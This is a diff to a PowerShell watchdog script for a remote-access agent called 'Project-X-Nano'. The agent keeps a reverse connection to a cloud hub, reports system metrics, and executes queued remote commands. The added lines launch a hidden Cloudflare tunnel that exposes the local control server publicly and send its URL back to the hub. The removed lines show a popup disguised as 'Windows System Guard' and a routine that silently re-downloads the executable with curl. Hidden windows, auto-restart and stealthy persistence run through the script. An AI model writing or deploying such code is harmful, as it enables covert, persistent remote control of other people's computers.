@@ -2,6 +2,7 @@
 #  Project-X-Nano Persistent Watchdog & Reverse Cloud Agent Loop
 #  Ensures 24/7 reverse connection to Vercel & Neon Postgres Cloud Fleet Hub.
 #  Reports real-time CPU, RAM, Battery, OS, Admin status every 15 seconds.
+#  Supervises Cloudflare Tunnel for direct 0-config global remote access.
 #  Executes queued remote fleet commands with zero port forwarding.
 # =========================================================================
 
@@ -22,6 +23,9 @@ if (-not (Test-Path $TargetDir)) {
 
 $ExePath = Join-Path $TargetDir "Project-X-Nano.exe"
 $CfgPath = Join-Path $TargetDir "config.json"
+$CloudflaredExe = Join-Path $TargetDir "cloudflared.exe"
+$CloudflaredLog = Join-Path $TargetDir "cloudflared.log"
+$PublicUrlFile = Join-Path $TargetDir "public_url.txt"
 $UnlockFile = Join-Path $TargetDir "uninstalling.lock"
 
 # Read Backend URL from config.json if available
@@ -41,27 +45,43 @@ $computer = $env:COMPUTERNAME
 $devName = $computer
 $deviceId = "pc_" + ($computer.ToLower() -replace '[^a-z0-9_-]', '_')
 
-function Show-AlertPopup {
-    param([string]$Message, [string]$Title = "Windows System Guard")
-    try {
-        $wshell = New-Object -ComObject Wscript.Shell
-        $wshell.Popup($Message, 5, $Title, 48) | Out-Null
-    } catch {}
+function Get-TunnelUrl {
+    if (Test-Path $PublicUrlFile) {
+        $u = (Get-Content $PublicUrlFile -Raw).Trim()
+        if ($u -match "https://[a-zA-Z0-9-]+\.trycloudflare\.com") {
+            return $u
+        }
+    }
+    if (Test-Path $CloudflaredLog) {
+        $m = Select-String -Path $CloudflaredLog -Pattern "https://[a-zA-Z0-9-]+\.trycloudflare\.com" | Select-Object -Last 1
+        if ($m) {
+            $u = $m.Matches[0].Value
+            Set-Content $PublicUrlFile -Value $u -Force
+            return $u
+        }
+    }
+    return ""
 }
 
-function Repair-Files {
+function Ensure-TunnelAndServer {
     if (Test-Path $UnlockFile) { return }
 
-    if (-not (Test-Path $ExePath) -or (Get-Item $ExePath).Length -lt 100000) {
-        try {
-            curl.exe -L -s -o "$ExePath" "$EXE_URL"
-        } catch {}
+    # 1. Ensure Local Server is running
+    $procServer = Get-Process -Name "Project-X-Nano", "RemotePC" -ErrorAction SilentlyContinue
+    $pythonServer = Get-CimInstance Win32_Process -Filter "CommandLine LIKE '%server.py%'" -ErrorAction SilentlyContinue
+
+    if (-not $procServer -and -not $pythonServer) {
+        if (Test-Path (Join-Path $TargetDir "server.py")) {
+            Start-Process -FilePath "python.exe" -ArgumentList "server.py --no-elevate" -WorkingDirectory "$TargetDir" -WindowStyle Hidden
+        } elseif (Test-Path $ExePath) {
+            Start-Process -FilePath "$ExePath" -WorkingDirectory "$TargetDir" -WindowStyle Hidden
+        }
     }
 
-    if (-not (Test-Path $CfgPath) -or (Get-Item $CfgPath).Length -lt 10) {
-        try {
-            curl.exe -L -s -o "$CfgPath" "$GITHUB_RAW_BASE/config.json"
-        } catch {}
+    # 2. Ensure Cloudflare Tunnel is running
+    $procTunnel = Get-Process -Name "cloudflared" -ErrorAction SilentlyContinue
+    if (-not $procTunnel -and (Test-Path $CloudflaredExe)) {
+        Start-Process -FilePath "$CloudflaredExe" -ArgumentList "tunnel --url http://127.0.0.1:8765 --logfile `"$CloudflaredLog`"" -WorkingDirectory "$TargetDir" -WindowStyle Hidden
     }
 }
 
@@ -69,6 +89,9 @@ function Send-FleetHeartbeat {
     try {
         $ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias 'Wi-Fi*','Ethernet*' -ErrorAction SilentlyContinue | Where-Object { $_.IPAddress -notlike "169.254*" } | Select-Object -First 1).IPAddress
         if (-not $ip) { $ip = "127.0.0.1" }
+
+        $tunnelUrl = Get-TunnelUrl
+        $activeUrl = if ($tunnelUrl) { $tunnelUrl } else { $BackendUrl }
 
         # System Metrics
         $cpuLoad = 0
@@ -99,9 +122,9 @@ function Send-FleetHeartbeat {
             id = $deviceId
             name = $devName
             host = $computer
-            host_url = $BackendUrl
-            tunnel_url = $BackendUrl
-            public_url = $BackendUrl
+            host_url = $activeUrl
+            tunnel_url = $tunnelUrl
+            public_url = $activeUrl
             lan_ip = $ip
             port = 8765
             cpu = $cpuLoad
@@ -113,6 +136,7 @@ function Send-FleetHeartbeat {
                 battery = $batPercent
                 boot_time = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
                 platform = "Windows"
+                tunnel = if ($tunnelUrl) { "active" } else { "none" }
             }
         }
 
@@ -180,10 +204,12 @@ function Poll-FleetCommands {
     } catch {}
 }
 
-# Initial Heartbeat
+# Initial Startup
+Ensure-TunnelAndServer
+Start-Sleep -Seconds 2
 Send-FleetHeartbeat
 
-# Main Watchdog & Cloud Loop
+# Main Loop
 $loopCounter = 0
 
 while ($true) {
@@ -191,30 +217,13 @@ while ($true) {
         break
     }
 
-    # 1. Poll cloud commands every iteration (~3 seconds)
     Poll-FleetCommands
 
-    # 2. Check and restart Project-X-Nano Host Server
-    $procServer = Get-Process -Name "Project-X-Nano", "RemotePC" -ErrorAction SilentlyContinue
-    $pythonServer = Get-CimInstance Win32_Process -Filter "CommandLine LIKE '%server.py%'" -ErrorAction SilentlyContinue
-
-    if (-not $procServer -and -not $pythonServer) {
-        if (-not (Test-Path $UnlockFile)) {
-            Repair-Files
-            if (Test-Path $ExePath) {
-                Start-Process -FilePath "$ExePath" -WorkingDirectory "$TargetDir" -WindowStyle Hidden
-            } elseif (Test-Path (Join-Path $TargetDir "server.py")) {
-                Start-Process -FilePath "python.exe" -ArgumentList "server.py" -WorkingDirectory "$TargetDir" -WindowStyle Hidden
-            }
-        }
-    }
-
-    # 3. Heartbeat to Cloud every ~15 seconds (every 5 loops of 3s)
     $loopCounter++
     if ($loopCounter -ge 5) {
         $loopCounter = 0
+        Ensure-TunnelAndServer
         Send-FleetHeartbeat
-        Repair-Files
     }
 
     Start-Sleep -Seconds 3
